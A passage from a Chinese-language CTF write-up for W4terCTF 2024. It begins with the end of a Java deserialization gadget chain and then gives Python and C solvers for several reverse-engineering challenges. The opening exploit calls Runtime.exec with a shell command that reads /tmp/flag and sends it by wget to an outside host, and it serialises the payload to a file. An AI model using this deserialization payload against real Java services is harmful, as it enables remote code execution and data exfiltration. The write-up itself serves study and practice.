        W4terInvokerTransformer<Object, Object> transformer1 = new W4terInvokerTransformer<>(
            "exec",                                         // 方法名，使用Runtime.exec来执行命令
            new Class<?>[] {String[].class},                  // 参数类型，exec方法接受一个字符串参数
            // new Object[] {"/bin/sh FLAG_CONTENT=$(cat /tmp/flag) && ping -c 1 $FLAG_CONTENT.ZRHan.dnslog.pw"}                           // 参数值，Windows中打开计算器的命令
            new Object[] {new String[]{"/bin/sh", "-c", "wget http://azure.zrhan.top:8000/`cat /tmp/flag`"}}                           
        );
        Comparator comparator1 = new W4terTransformingComparator<Object, Object>(transformer1, new W4terComparator());
        Comparator comparator2 = new W4terTransformingComparator<Object, Object>(transformer2, comparator1);
        Comparator comparator3 = new W4terTransformingComparator<Object, Object>(transformer3, comparator2);

        // 创建W4terTransformingComparator，从String到String
        // W4terTransformingComparator<String, String> w4tertransformingcomparator = new W4terTransformingComparator<>(transformer, stringComparator);

        // 创建PriorityQueue，使用自定义的Comparator
        PriorityQueue<Class> priorityQueue = new PriorityQueue<>(2, comparator3);

        // 添加测试数据到PriorityQueue
        priorityQueue.add(Runtime.class);
        priorityQueue.add(Runtime.class);
        // priorityQueue.add("cherry");

        // 序列化PriorityQueue到文件
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("priorityQueue.ser"))) {
            oos.writeObject(priorityQueue);
            System.out.println("PriorityQueue has been serialized to file 'priorityQueue.ser'");
        } catch (IOException e) {
            System.err.println("Error serializing PriorityQueue: " + e.getMessage());
        }
    }
}

```

# REVERSE

## box

IDA搜索flag、W4terCTF、success、congratula等字符串，可以定位到入口点，很容易发现是一个简单的异或逻辑。

```python
hex_data = "7A 05 6E 01 02 69 54 6B 49 09 58 54 53 67 62 4F 77 50 60 4E 60 63 7A 69 18 79 1C 49 68 4B 15 63 4B 4D 53 45 20 49 5D 5B 74 71 46 71 6C 41 2C 49 4D"
for idx, d in enumerate(hex_data.split()):
    t = int(d, 16)
    # print(t)
    t ^= idx
    t ^= 0x33
    # print(t)
    print(chr(t), end="")
# I7_15_a_r3allY_sTrAnGE_M3S5aGe8OX_BU7_HOok_is_1UN
```

## BruteforceMe

第一层是异或再*17，第二层是base64魔改，第三层是一个加密算法的魔改。

第三层直接逆向，第二层似乎难以逆向，于是直接暴力。

```python
import string
def sub_55B1ECB9A290(data):
    # 假设 aAbcdefghijklmn 是一个由 C 代码定义的映射表，这里我们用一个示例 Python 字典来表示
    mapping = {i: chr for i, chr in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")}


    length = len(data)
    result_length = 4 * ((length + 2) // 3)
    result = bytearray(result_length + 1)

    v4 = 0
    i = 0
    while (length % 3 != 0 and v4 < length - 3) or (length % 3 == 0 and v4 < length):
        byte1 = data[v4]
        byte2 = data[v4 + 1] if v4 + 1 < length else 0
        byte3 = data[v4 + 2] if v4 + 2 < length else 0

        result[i + 3] = ~ord(mapping[(byte1 >> 2)]) & 0xFF
        result[i + 2] = ~ord(mapping[((16*byte1)&0x30) | (byte2>>4)]) & 0xFF
        result[i + 1] = ~ord(mapping[((4*byte2)&0x3c) | (byte3 >> 6)]) & 0xFF
        result[i] = ~ord(mapping[byte3 & 0x3F]) &0xFF

        v4 += 3
        i += 4

    if length % 3 == 2:
        byte1 = data[v4]
        byte2 = data[v4 + 1]
        result[i + 3] = 255 - ord(mapping[(byte1 >> 2) & 0x3F])
        result[i + 2] = 255 - ord(mapping[((byte1 << 4) | (byte2 >> 4)) & 0x3F])
        result[i + 1] = 255 - ord(mapping[(byte2 << 2) & 0x3F])
        result[i] = 126  # ASCII for '~'
    elif length % 3 == 1:
        byte1 = data[v4]
        result[i + 3] = 255 - ord(mapping[(byte1 >> 2) & 0x3F])
        result[i + 2] = 255 - ord(mapping[(byte1 << 4) & 0x3F])
        result[i + 1] = 126  # ASCII for '~'
        result[i] = 126  # ASCII for '~'

    result[result_length] = 0  # Null-terminate the result (not necessary in Python but mimics C behavior)

    return bytes(result)

def xor_0x87_times_17(data):
    # 首先，确保输入是 bytearray 类型，以便我们可以修改它
    if isinstance(data, bytes):
        data = bytearray(data)  # 如果输入是 bytes，转换为 bytearray
    # 进行 XOR 和乘法操作
    for i in range(len(data)):
        data[i] ^= 0x87  # XOR 操作
        data[i] = (data[i] * 17) % 256  # 乘以 17 并取 256 的模以保持字节范围
    return bytes(data)  # 返回 bytes 类型的结果

# Example usage
# example_input = b"0123456701234567012345670123456701234567012"
# encoded_output = sub_55B1ECB9A290(xor_0x87_times_17(example_input))
# print(encoded_output)
chrs = string.printable
ord_chrs = [ord(chr) for chr in chrs]
ciphex = bytes.fromhex("95b2b0cfbaaa94bec7b8c6be939493c7b8a5bdc6abb6d4be9aa7bba8acabd0be92aebea8bd95a9a8cf9593cbb4b499a895a7bac6abb6be8c7e7e9892")
def bruteforce_ciphex(ciphex):
    # 初始化一个空的列表来存储可能的匹配结果
    possible_matches = []
    
    # 遍历所有可能的三字节组合
    for byte1 in ord_chrs:
        for byte2 in ord_chrs:
            for byte3 in ord_chrs:
                # 构建一个三字节的数据块
                original_bytes = bytes([byte1, byte2, byte3])
                
                # 对这个数据块应用 xor_0x87_times_17 函数
                processed_bytes = xor_0x87_times_17(original_bytes)
                
                # 再对处理后的数据块应用 sub_55B1ECB9A290 函数
                encoded_bytes = sub_55B1ECB9A290(processed_bytes)
                
                # 由于sub_55B1ECB9A290生成的结果长度可能超过ciphex的片段长度，只取前相同长度的部分进行比较
                if encoded_bytes[:len(ciphex)] == ciphex:
                    # 如果匹配成功，记录下原始的三字节数据
                    possible_matches.append(original_bytes)
    
    return possible_matches

# print(sub_55B1ECB9A290(xor_0x87_times_17(b"W4ter")))
matches = []
for i in range(0, len(ciphex), 4):
    bruted = bruteforce_ciphex(ciphex[i:i+4])[0]
    if bruted is None:
        raise Exception("No match found")
    matches += bruted
    print(''.join(chr(num) for num in matches))
# print(matches)
# W4terCTF{UNR31aTEd_byT35_CAN_6E_3NUm3r47ed
```

## norr

可以发现逻辑是

![image-20240429185010626](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429185010626-171449181739915.png)

主要是func3. 硬刚即可。

![image-20240429185135948](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429185135948-171449181739916.png)

![image-20240429185148646](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429185148646-171449181739917.png)

![image-20240429185155341](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429185155341-171449181739918.png)

![image-20240429185201717](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429185201717-171449181739919.png)

```python
def compute_values(int1):
    # d = [0] * 14  # 创建一个长度为14的数组，初始化所有元素为0

    # # 根据赋值逻辑计算d的值
    # d[2] = ~102
    # d[0] = 102
    # d[1] = ~int1
    # d[4] = ~(102 | ~int1)
    # d[0] = 102 | ~int1
    # d[2] = ~(102 | ~int1)
    # d[3] = ~int1
    # d[0] = int1
    # d[1] = ~102
    # d[4] = ~(int1 | ~102)
    # d[0] = (int1 | ~102)
    # d[3] = ~(int1 | ~102)
    # d[4] = ~(~(102 | ~int1) | ~(int1 | ~102))
    # int1 = ~(102 | ~int1) | ~(int1 | ~102)

    return int1 ^ 102

    return int1

int1 = 0x30
d5 = 0b11001100  # 示例二进制数
result = compute_values(int1)
print("result: ", result)
```

## 古老的语言

使用vb decompiler可以反编译。但是开优化的话会有错误（var_B0那里）

然后一直以为leftRotate是左旋转，后面找到一个工具VBDEC.exe去调试pcode，才知道是单纯位移。

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
// 模拟 VB 中的 AddLong 函数
uint32_t AddLong(uint32_t a, uint32_t b) {
    return a + b;
}

// 位操作辅助函数
uint32_t LeftRotateLong(uint32_t value, uint32_t shift) {
    uint32_t uvalue = (uint32_t) value;  // 转换为无符号类型以避免算术右移
    return (value << shift) | (value >> (32 - shift));
}

uint32_t RightRotateLong(uint32_t value, uint32_t shift) {
    uint32_t uvalue = (uint32_t) value;  // 转换为无符号类型以避免算术右移
    return (uvalue >> shift) | (uvalue << (32 - shift));
}


int Fxxxtel(unsigned int * var_A0) {
    
    unsigned int  result = 0xFF;

    // 遍历输入数组 'raw'
    unsigned int var_AC, var_C0;
    unsigned int var_A6, var_B0, var_B4, var_B8, var_BC;
    unsigned int var_C4, var_C8, var_CC, var_D4;
    for (var_AC = 0; var_AC <= 9; var_AC += 3) {
        var_A6 = var_AC;
        var_B0 = 0;
        var_B4 = var_A0[var_A6];
        var_B8 = var_A0[var_A6 + 1];
        var_BC = var_A0[var_A6 + 2];

        for (var_C0 = 1; var_C0 <= 32; var_C0++) {
            // printf("var_B0: %x\n", var_B0);
            // printf("var_B4: %x\n", var_B4);
            // printf("var_B8: %x\n", var_B8);
            // printf("var_BC: %x\n", var_BC);
            
            
            var_C8 = var_B0 + (unsigned)(-1640531527); // 61C8 8647
            var_B0 = var_C8;

            var_C4 = var_C8 << 4;
            // printf("left rotate var_C4: %x\n", var_C4);
            var_CC = var_C4 ^ -559038737; // DEAD BEEF
            var_C8 = var_CC + (var_B8 ^ var_B0);
            printf("add var_C8: %x\n", var_C8);
            var_CC = var_C8;
            
            var_C4 = var_B8 >> 5;
            // printf("right rotate var_C4: %x\n", var_C4);
            var_D4 = var_CC + (var_C4 ^ -1161901314); // BABECAFE
            var_CC = var_D4;
            var_B4 = var_B4 ^ var_CC;
            // printf("var_B4: %x\n", var_B4);

            var_C4 = var_BC << 4;
            var_CC = var_C4 ^ -559038737;
            var_C8 = var_CC + (var_BC ^ var_B0);
            var_CC = var_C8;
            var_C4 = (var_BC >> 5);
            var_D4 = var_CC + (var_C4 ^ -1161901314);
            var_CC = var_D4;
            var_B8 = var_B8 ^ var_CC;

            var_C4 = (var_B4 << 4);
            var_CC = var_C4 ^ -559038737;
            var_C8 = var_CC + (var_B4 ^ var_B0);
            var_CC = var_C8;
            var_C4 = (var_B4 >> 5);
            var_D4 = var_CC + (var_C4 ^ -1161901314);
            var_CC = var_D4;
            var_BC = var_BC ^ var_CC;

            // getchar();
        }

        var_A0[var_A6] = var_B4;
        var_A0[var_A6 + 1] = var_B8;
        var_A0[var_A6 + 2] = var_BC;
    }
    // printf("final_B0: %d\n", var_B0);
    for (int i=0; i<12; ++i) {
        printf("%u, ", var_A0[i]);
    }
    puts("");
    // 一系列的检验，确定var_A0数组中的数据是否符合特定的值
    // int expected_values[12] = {-1719513012, 0x5E453769, 0x1677BCE3, 0x274285B4, -1073299571, -1079396546, 0x4E17793A, -385687817, 0x710AAA57, -1288653938, -1587386381, 0x74E9FB14};
    // for (int i = 0; i < 12; i++) {
    //     if (var_A0[i] != expected_values[i]) {
    //         result = 0;
    //         break;
    //     }
    // }

    return result;
}

// 解密函数
unsigned int* FxxxtelDecrypt(unsigned int var_A0[]) {
    unsigned int result = 0xFF;

    unsigned int var_AC, var_C0;
    unsigned int var_A6, var_B0, var_B4, var_B8, var_BC;
    unsigned int var_C4, var_C8, var_CC, var_D4;

    for (var_AC = 0; var_AC <= 9; var_AC += 3) {
        var_A6 = var_AC;
        var_B0 = -957401312;
        var_B4 = var_A0[var_A6];
        var_B8 = var_A0[var_A6 + 1];
        var_BC = var_A0[var_A6 + 2];

        for (var_C0 = 32; var_C0 >= 1; var_C0--) {
            // 反向操作: XOR 和 Addition 的逆操作
            var_C4 = (var_B4 << 4);
            var_CC = var_C4 ^ -559038737;
            var_C8 = var_CC + (var_B4 ^ var_B0);
            var_CC = var_C8;
            var_C4 = (var_B4 >> 5);
            var_D4 = var_CC + (var_C4 ^ -1161901314);
            var_CC = var_D4;
            var_BC = var_BC ^ var_CC;

            var_C4 = (var_BC << 4);
            var_CC = var_C4 ^ -559038737;
            var_C8 = var_CC + (var_BC ^ var_B0);
            var_CC = var_C8;
            var_C4 = (var_BC >> 5);
            var_D4 = var_CC + (var_C4 ^ -1161901314);
            var_CC = var_D4;
            var_B8 = var_B8 ^ var_CC;

            var_C4 = (var_B8 << 4);  // 左旋转4位
            var_CC = var_C4 ^ -559038737;
            var_C8 = var_CC + (var_B8 ^ var_B0);
            var_CC = var_C8;
            var_C4 = (var_B8 >> 5);  // 右旋转5位
            var_D4 = var_CC + (var_C4 ^ -1161901314);
            var_CC = var_D4;
            var_B4 = var_B4 ^ var_CC;

            // 反向操作: 更新 var_B0
            var_C8 = var_B0 + 1640531527;
            var_B0 = var_C8;
        }
        printf("var_B0: %u\n", var_B0);
        var_A0[var_A6] = var_B4;
        var_A0[var_A6 + 1] = var_B8;
        var_A0[var_A6 + 2] = var_BC;
    }
    for (int i=0; i<12; ++i) {
        printf("%u, ", var_A0[i]);
    }
    puts("");
    return var_A0;
}

// 将int数组转换为十六进制字符串的函数
void intArrayToHexString(int *array, int size, char *hexString) {
    char *ptr = hexString; // 指针用于构建字符串
    for (int i = 0; i < size; i++) {
        // 为每个整数生成一个十六进制形式的字符串
        sprintf(ptr, "%08X", array[i]);
        ptr += 8; // 移动指针到下一个位置
    }
    *ptr = '\0'; // 添加字符串终止符
}

int main() {
    // 示例使用：提供一个初始数组 raw
    // uint32_t raw[12] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
    // Fxxxtel(raw);
    // uint32_t raw2[12] = {310934673, 499298654, 2218878038, 698281177, 611794124, 3042240565, 2461360152, 2489961260, 3106737282, 513224779, 2259112052, 3206966772};
    // FxxxtelDecrypt(raw2);

    uint32_t raw3[12] = {0x30313233, 0x34353637, 0x38393031, 0x30313233, 0x34353637, 0x38393031, 0x30313233, 0x34353637, 0x38393031, 0x30313233, 0x34353637, 0x38393031};
    Fxxxtel(raw3);
    unsigned int numbers[] = {
        -1719513012, 
        0x5E453769, 
        0x1677BCE3, 
        0x274285B4, 
        -1073299571, 
        -1079396546, 
        0x4E17793A, 
        -385687817, 
        0x710AAA57, 
        -1288653938, 
        -1587386381, 
        0x74E9FB14
    };
    unsigned* decnums = FxxxtelDecrypt(numbers);
    char* hex_string = malloc(12 * 8 + 1);
    intArrayToHexString(decnums, 12, hex_string);
    printf("Decrypted: %s\n", hex_string);

    // Fxxxtel(decnums);
    return 0;
}

```

## Crabs

第一层是异或。第二层是按照每个字母的顺序生成一个矩阵。第三层是矩阵乘法。

第三层求逆矩阵，第二层IDA搜索找出原数组，第一层异或回去。

```python
import numpy as np
t = "1Dv\qvYcz=}TmR~>sEgAQJA{LqEv]iLVX~cM@"
flag = ["x"] * 55
for idx, i in enumerate(t):
    print(chr(ord(i) ^ idx), end="")
    flag[idx] = chr(ord(i) ^ idx)
print()
print(chr(58), chr(64), chr(91), chr(96), chr(95))
flag[43] = chr(95)
flag[49] = chr(95)
print("".join(flag))

def invert_matrix(flat_matrix):
    if len(flat_matrix) != 17 * 17:
        raise ValueError("The input list must represent a 17x17 matrix.")

    # 将一维列表转换成 17x17 的二维数组
    matrix = np.array(flat_matrix).reshape(17, 17)

    # 计算逆矩阵
    try:
        inverse_matrix = np.linalg.inv(matrix)
        # 对逆矩阵结果四舍五入至最近的整数
        rounded_inverse_matrix = inverse_matrix
        # rounded_inverse_matrix = np.round(inverse_matrix).astype(int)
    except np.linalg.LinAlgError:
        raise ValueError("The matrix is not invertible.")

    # 将二维逆矩阵转换回一维列表
    flat_inverse_matrix = rounded_inverse_matrix.flatten().tolist()

    return flat_inverse_matrix

def str_to_little_endian_hex(hex_str):

    # 将十六进制字符串按每两个字符进行分组，然后反转顺序并拼接回字符串
    little_endian_hex = ''.join(reversed([hex_str[i:i+2] for i in range(0, len(hex_str), 2)]))

    # 将处理好的小端序十六进制字符串转换为大写并格式化输出
    return int(little_endian_hex.upper(), 16)

def matrix_multiply(flat_matrix1, flat_matrix2, dim1, dim2, dim3):
    # 将一维列表转换成对应的二维数组
    matrix1 = np.array(flat_matrix1).reshape(dim1, dim2)
    matrix2 = np.array(flat_matrix2).reshape(dim2, dim3)

    # 执行矩阵乘法
    result_matrix = np.dot(matrix1, matrix2)

    # 将结果矩阵转换回一维列表
    flat_result_matrix = result_matrix.flatten().tolist()

    return flat_result_matrix

B_str = """
0E 00 00 00 1E 00 00 00  0A 00 00 00 31 00 00 00
1C 00 00 00 01 00 00 00  2A 00 00 00 15 00 00 00
26 00 00 00 00 00 00 00  15 00 00 00 17 00 00 00
2D 00 00 00 24 00 00 00  22 00 00 00 15 00 00 00
26 00 00 00 08 00 00 00  2F 00 00 00 18 00 00 00
24 00 00 00 2B 00 00 00  0C 00 00 00 12 00 00 00
00 00 00 00 09 00 00 00  1D 00 00 00 29 00 00 00
31 00 00 00 02 00 00 00  1D 00 00 00 04 00 00 00
2D 00 00 00 16 00 00 00  0B 00 00 00 30 00 00 00
23 00 00 00 21 00 00 00  25 00 00 00 23 00 00 00
2C 00 00 00 2C 00 00 00  0A 00 00 00 24 00 00 00
07 00 00 00 14 00 00 00  1B 00 00 00 0B 00 00 00
25 00 00 00 27 00 00 00  14 00 00 00 1E 00 00 00
04 00 00 00 01 00 00 00  14 00 00 00 0C 00 00 00
30 00 00 00 07 00 00 00  1F 00 00 00 0C 00 00 00
23 00 00 00 10 00 00 00  2E 00 00 00 1C 00 00 00
00 00 00 00 08 00 00 00  20 00 00 00 10 00 00 00
2A 00 00 00 22 00 00 00  09 00 00 00 05 00 00 00
17 00 00 00 0B 00 00 00  2D 00 00 00 2C 00 00 00
0E 00 00 00 2F 00 00 00  31 00 00 00 0D 00 00 00
1D 00 00 00 22 00 00 00  00 00 00 00 12 00 00 00
2C 00 00 00 1F 00 00 00  21 00 00 00 2C 00 00 00
21 00 00 00 1B 00 00 00  06 00 00 00 2C 00 00 00
00 00 00 00 21 00 00 00  25 00 00 00 09 00 00 00
2A 00 00 00 2F 00 00 00  01 00 00 00 17 00 00 00
30 00 00 00 08 00 00 00  10 00 00 00 2A 00 00 00
1F 00 00 00 1B 00 00 00  2B 00 00 00 2C 00 00 00
1F 00 00 00 19 00 00 00  1B 00 00 00 05 00 00 00
10 00 00 00 22 00 00 00  1B 00 00 00 27 00 00 00
0B 00 00 00 19 00 00 00  11 00 00 00 19 00 00 00
1B 00 00 00 12 00 00 00  18 00 00 00 1D 00 00 00
01 00 00 00 2E 00 00 00  20 00 00 00 22 00 00 00
1A 00 00 00 29 00 00 00  23 00 00 00 11 00 00 00
0C 00 00 00 1D 00 00 00  2C 00 00 00 14 00 00 00
02 00 00 00 21 00 00 00  10 00 00 00 23 00 00 00
1F 00 00 00 06 00 00 00  06 00 00 00 13 00 00 00
2B 00 00 00 06 00 00 00  1E 00 00 00 19 00 00 00
04 00 00 00 16 00 00 00  10 00 00 00 0A 00 00 00
1C 00 00 00 1A 00 00 00  0B 00 00 00 0F 00 00 00
1D 00 00 00 19 00 00 00  17 00 00 00 23 00 00 00
08 00 00 00 27 00 00 00  18 00 00 00 04 00 00 00
0C 00 00 00 10 00 00 00  06 00 00 00 0C 00 00 00
27 00 00 00 20 00 00 00  11 00 00 00 13 00 00 00
28 00 00 00 23 00 00 00  09 00 00 00 15 00 00 00
0B 00 00 00 2E 00 00 00  08 00 00 00 02 00 00 00
23 00 00 00 0F 00 00 00  0D 00 00 00 02 00 00 00
21 00 00 00 0D 00 00 00  2A 00 00 00 0E 00 00 00
1C 00 00 00 26 00 00 00  08 00 00 00 17 00 00 00
2E 00 00 00 14 00 00 00  06 00 00 00 1B 00 00 00
15 00 00 00 29 00 00 00  0E 00 00 00 1F 00 00 00
1D 00 00 00 24 00 00 00  2D 00 00 00 05 00 00 00
0F 00 00 00 0F 00 00 00  0E 00 00 00 1A 00 00 00
11 00 00 00 11 00 00 00  23 00 00 00 1D 00 00 00
27 00 00 00 2E 00 00 00  2D 00 00 00 1B 00 00 00
2E 00 00 00 18 00 00 00  0E 00 00 00 0E 00 00 00
08 00 00 00 27 00 00 00  31 00 00 00 06 00 00 00
12 00 00 00 0B 00 00 00  0D 00 00 00 02 00 00 00
00 00 00 00 28 00 00 00  30 00 00 00 0F 00 00 00
13 00 00 00 2C 00 00 00  02 00 00 00 2E 00 00 00
18 00 00 00 23 00 00 00  29 00 00 00 0B 00 00 00
08 00 00 00 05 00 00 00  0C 00 00 00 2B 00 00 00
1F 00 00 00 15 00 00 00  12 00 00 00 17 00 00 00
27 00 00 00 15 00 00 00  2B 00 00 00 1B 00 00 00
03 00 00 00 08 00 00 00  2B 00 00 00 31 00 00 00
2B 00 00 00 31 00 00 00  0E 00 00 00 2A 00 00 00
2B 00 00 00 1A 00 00 00  01 00 00 00 01 00 00 00
07 00 00 00 2A 00 00 00  31 00 00 00 0E 00 00 00
16 00 00 00 31 00 00 00  07 00 00 00 08 00 00 00
00 00 00 00 0B 00 00 00  05 00 00 00 11 00 00 00
0F 00 00 00 21 00 00 00  2C 00 00 00 0A 00 00 00
29 00 00 00 27 00 00 00  29 00 00 00 1D 00 00 00
20 00 00 00 25 00 00 00  2F 00 00 00 14 00 00 00
11 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
"""


C_str = """
33 38 00 00 65 44 00 00  E2 33 00 00 A9 39 00 00
36 3D 00 00 CA 3F 00 00  F8 46 00 00 3B 31 00 00
92 3B 00 00 2C 3F 00 00  21 47 00 00 15 46 00 00
B0 43 00 00 11 30 00 00  D0 3B 00 00 8A 3F 00 00
48 39 00 00 E8 3E 00 00  09 4B 00 00 21 39 00 00
4E 3F 00 00 41 43 00 00  A7 40 00 00 AE 4C 00 00
48 35 00 00 6A 41 00 00  27 44 00 00 84 4A 00 00
44 4A 00 00 F0 47 00 00  CB 31 00 00 14 3C 00 00
D9 45 00 00 97 3F 00 00  84 3C 00 00 B3 4B 00 00
AC 36 00 00 F7 40 00 00  87 41 00 00 EF 3C 00 00
5A 4B 00 00 BF 35 00 00  66 45 00 00 67 48 00 00
1F 49 00 00 AC 48 00 00  21 4A 00 00 44 30 00 00
9C 3C 00 00 60 47 00 00  0F 3F 00 00 B3 40 00 00
65 55 00 00 2F 3C 00 00  FF 49 00 00 06 4B 00 00
C9 40 00 00 73 54 00 00  ED 3A 00 00 92 4C 00 00
63 4C 00 00 06 51 00 00  09 52 00 00 2C 50 00 00
F8 37 00 00 CA 41 00 00  57 50 00 00 80 45 00 00
3D 3F 00 00 48 50 00 00  ED 39 00 00 5A 44 00 00
4F 46 00 00 EC 3F 00 00  77 50 00 00 88 39 00 00
73 49 00 00 76 4A 00 00  E8 4C 00 00 41 4D 00 00
0D 4D 00 00 A7 33 00 00  44 3F 00 00 F5 4B 00 00
84 41 00 00 00 00 00 00  00 00 00 00 00 00 00 00
"""

m_B = []
for idx, hex in enumerate(B_str.split()):
    if idx % 4 == 0:
        m_B.append(int(hex, 16))
m_B = m_B[:-3]
m_B = invert_matrix(m_B)

m_C = []
for idx in range(85):
    num = str_to_little_endian_hex("".join(C_str.split()[idx*4:idx*4+4]))
    m_C.append(num)


m_A = matrix_multiply(m_C, m_B, 5, 17, 17)
for i in range(5):
    for j in range(17):
        # print(round(m_A[i*17+j]), end=" ")
        print(chr(round(m_A[i*17+j])), end="")
    print()


B_str = """
18 00 00 00 07 00 00 00  1B 00 00 00 2E 00 00 00
2C 00 00 00 0B 00 00 00  0F 00 00 00 08 00 00 00
0A 00 00 00 08 00 00 00  1B 00 00 00 1C 00 00 00
18 00 00 00 1A 00 00 00  12 00 00 00 08 00 00 00
04 00 00 00 17 00 00 00  2D 00 00 00 27 00 00 00
24 00 00 00 1E 00 00 00  22 00 00 00 2C 00 00 00
11 00 00 00 1D 00 00 00  30 00 00 00 04 00 00 00
1D 00 00 00 2E 00 00 00  22 00 00 00 2C 00 00 00
22 00 00 00 2B 00 00 00  09 00 00 00 0C 00 00 00
21 00 00 00 07 00 00 00  2E 00 00 00 0E 00 00 00
0F 00 00 00 0A 00 00 00  2F 00 00 00 0D 00 00 00
11 00 00 00 09 00 00 00  12 00 00 00 07 00 00 00
03 00 00 00 1E 00 00 00  0D 00 00 00 0E 00 00 00
19 00 00 00 00 00 00 00  1D 00 00 00 1D 00 00 00
08 00 00 00 1D 00 00 00  08 00 00 00 28 00 00 00
21 00 00 00 14 00 00 00  06 00 00 00 1F 00 00 00
2B 00 00 00 2E 00 00 00  23 00 00 00 05 00 00 00
1C 00 00 00 0C 00 00 00  1C 00 00 00 12 00 00 00
27 00 00 00 05 00 00 00  14 00 00 00 2B 00 00 00
23 00 00 00 1C 00 00 00  01 00 00 00 1A 00 00 00
04 00 00 00 29 00 00 00  19 00 00 00 26 00 00 00
07 00 00 00 25 00 00 00  14 00 00 00 2F 00 00 00
15 00 00 00 14 00 00 00  24 00 00 00 31 00 00 00
15 00 00 00 0D 00 00 00  29 00 00 00 04 00 00 00
1D 00 00 00 0B 00 00 00  07 00 00 00 01 00 00 00
10 00 00 00 01 00 00 00  1A 00 00 00 2D 00 00 00
0D 00 00 00 05 00 00 00  19 00 00 00 00 00 00 00
1E 00 00 00 0B 00 00 00  16 00 00 00 0C 00 00 00
1D 00 00 00 23 00 00 00  2C 00 00 00 0B 00 00 00
2F 00 00 00 20 00 00 00  1E 00 00 00 23 00 00 00
2E 00 00 00 05 00 00 00  18 00 00 00 19 00 00 00
0A 00 00 00 04 00 00 00  1F 00 00 00 09 00 00 00
14 00 00 00 05 00 00 00  04 00 00 00 0A 00 00 00
24 00 00 00 0E 00 00 00  1E 00 00 00 2C 00 00 00
2A 00 00 00 31 00 00 00  28 00 00 00 2F 00 00 00
0F 00 00 00 07 00 00 00  0E 00 00 00 10 00 00 00
1A 00 00 00 28 00 00 00  07 00 00 00 08 00 00 00
23 00 00 00 2A 00 00 00  08 00 00 00 2C 00 00 00
01 00 00 00 19 00 00 00  00 00 00 00 0E 00 00 00
16 00 00 00 0A 00 00 00  17 00 00 00 0C 00 00 00
09 00 00 00 12 00 00 00  11 00 00 00 0A 00 00 00
30 00 00 00 27 00 00 00  04 00 00 00 11 00 00 00
21 00 00 00 2C 00 00 00  0A 00 00 00 18 00 00 00
28 00 00 00 18 00 00 00  21 00 00 00 0D 00 00 00
24 00 00 00 13 00 00 00  15 00 00 00 28 00 00 00
14 00 00 00 20 00 00 00  11 00 00 00 11 00 00 00
25 00 00 00 2B 00 00 00  2E 00 00 00 1A 00 00 00
00 00 00 00 30 00 00 00  0D 00 00 00 15 00 00 00
10 00 00 00 06 00 00 00  1E 00 00 00 2D 00 00 00
23 00 00 00 28 00 00 00  20 00 00 00 24 00 00 00
0F 00 00 00 05 00 00 00  2D 00 00 00 01 00 00 00
18 00 00 00 1E 00 00 00  17 00 00 00 05 00 00 00
19 00 00 00 2D 00 00 00  24 00 00 00 02 00 00 00
23 00 00 00 0A 00 00 00  1C 00 00 00 17 00 00 00
0B 00 00 00 03 00 00 00  2F 00 00 00 07 00 00 00
14 00 00 00 19 00 00 00  1C 00 00 00 1C 00 00 00
29 00 00 00 1F 00 00 00  01 00 00 00 2B 00 00 00
2E 00 00 00 0D 00 00 00  08 00 00 00 09 00 00 00
2D 00 00 00 2F 00 00 00  29 00 00 00 12 00 00 00
2B 00 00 00 00 00 00 00  2B 00 00 00 0D 00 00 00
24 00 00 00 2A 00 00 00  1D 00 00 00 2A 00 00 00
21 00 00 00 26 00 00 00  11 00 00 00 03 00 00 00
09 00 00 00 22 00 00 00  31 00 00 00 0A 00 00 00
1C 00 00 00 20 00 00 00  19 00 00 00 03 00 00 00
19 00 00 00 29 00 00 00  1B 00 00 00 23 00 00 00
15 00 00 00 1B 00 00 00  0E 00 00 00 04 00 00 00
1F 00 00 00 20 00 00 00  1F 00 00 00 20 00 00 00
0F 00 00 00 11 00 00 00  0A 00 00 00 1F 00 00 00
1A 00 00 00 0B 00 00 00  2E 00 00 00 17 00 00 00
10 00 00 00 0C 00 00 00  00 00 00 00 13 00 00 00
02 00 00 00 10 00 00 00  0C 00 00 00 00 00 00 00
0B 00 00 00 04 00 00 00  25 00 00 00 26 00 00 00
1D 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
"""

C_str = """
1F 40 00 00 05 3D 00 00  10 49 00 00 52 3D 00 00
15 46 00 00 B1 2B 00 00  B6 3F 00 00 FA 34 00 00
AF 38 00 00 47 3A 00 00  4C 27 00 00 22 3F 00 00
8F 42 00 00 BB 35 00 00  98 3D 00 00 C6 4B 00 00
C6 31 00 00 40 41 00 00  03 3F 00 00 0A 4F 00 00
C5 41 00 00 00 4A 00 00  14 2F 00 00 E7 41 00 00
6F 37 00 00 46 3B 00 00  EF 3C 00 00 AC 2D 00 00
0C 44 00 00 76 4A 00 00  54 36 00 00 A5 41 00 00
D2 50 00 00 15 38 00 00  60 43 00 00 F4 3C 00 00
7C 54 00 00 F4 45 00 00  67 49 00 00 34 31 00 00
5F 41 00 00 91 37 00 00  45 3C 00 00 A8 3F 00 00
57 2D 00 00 2D 45 00 00  85 4C 00 00 87 36 00 00
B6 41 00 00 57 54 00 00  15 38 00 00 ED 3E 00 00
B3 39 00 00 E6 50 00 00  5F 41 00 00 BE 47 00 00
36 2F 00 00 A5 3F 00 00  E8 35 00 00 59 39 00 00
DF 3B 00 00 36 2C 00 00  75 41 00 00 9B 47 00 00
79 33 00 00 0D 40 00 00  3A 4F 00 00 18 35 00 00
89 3C 00 00 1B 38 00 00  0E 4B 00 00 EA 3E 00 00
28 44 00 00 49 2D 00 00  DB 3C 00 00 A7 32 00 00
F7 34 00 00 E4 36 00 00  3A 28 00 00 35 3D 00 00
16 44 00 00 59 31 00 00  43 3D 00 00 62 49 00 00
F9 31 00 00 00 00 00 00  00 00 00 00 00 00 00 00
"""

m_B = []
for idx, hex in enumerate(B_str.split()):
    if idx % 4 == 0:
        m_B.append(int(hex, 16))
m_B = m_B[:-3]
m_B = invert_matrix(m_B)

m_C = []
for idx in range(85):
    num = str_to_little_endian_hex("".join(C_str.split()[idx*4:idx*4+4]))
    m_C.append(num)


